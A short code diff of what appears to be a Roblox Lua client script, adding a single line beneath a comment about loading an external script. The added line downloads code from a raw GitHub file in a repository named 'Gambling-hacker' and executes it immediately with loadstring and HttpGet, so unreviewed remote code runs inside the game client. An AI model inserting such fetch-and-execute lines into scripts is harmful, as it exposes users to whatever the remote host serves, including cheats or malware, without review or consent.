@@ -172,7 +172,7 @@ local function onCharacterDied()
 end
 
 -- Load the external script only once
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SerialdesignationV-collab/Gambling-hacker/refs/heads/main/Lol"))()
 game.Players.LocalPlayer.CharacterAdded:Connect(function(character)
     character:WaitForChild("Humanoid").Died:Connect(onCharacterDied)
     onCharacterAdded(character)
